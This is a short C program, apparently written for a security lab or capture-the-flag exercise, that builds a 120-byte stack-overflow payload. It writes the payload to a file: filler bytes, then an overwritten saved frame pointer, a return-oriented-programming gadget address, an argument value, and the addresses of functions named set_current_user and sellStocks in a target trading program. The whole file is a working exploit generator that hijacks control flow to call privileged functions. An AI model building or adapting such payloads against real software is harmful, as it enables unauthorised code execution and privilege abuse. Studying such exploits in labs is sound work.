#include <stdio.h>


char bigBuffer[120];

char* insert8Bytes(long long num, char* curBuf) {
	for(int temp=0;temp<8;temp++) {
		char msb = (num & 0xFF);
		*(curBuf++) = msb;
		printf("%p 0x%02X\n", num,  (unsigned int)(msb));
		num >>= 8;
	}
	printf("\n");
	return curBuf;
}

int main() {

	FILE *fp = fopen("stat_fmt.txt", "w");

	char *curBuf = bigBuffer;
	for(int temp='a';temp<'k';temp++) {

		for(int temp2 = 0; temp2<8;temp2++) {
			*(curBuf++) = temp;
		}
	}


	long long savedEbp = 0x7fffffffdeb0;
	curBuf = insert8Bytes(savedEbp, curBuf);


	long long rdpGadget = 0x7FFFF79E7B6A;
	curBuf = insert8Bytes(rdpGadget, curBuf);

	long long one = 1;
	curBuf = insert8Bytes(one, curBuf);

	long long set_current_user = 0x7ffff3dd3289;
	curBuf = insert8Bytes(set_current_user, curBuf);


	long long sellStocks = 0x7ffff3dd32a6;
	curBuf = insert8Bytes(sellStocks, curBuf );

	fwrite(bigBuffer, 120, 1, fp );
}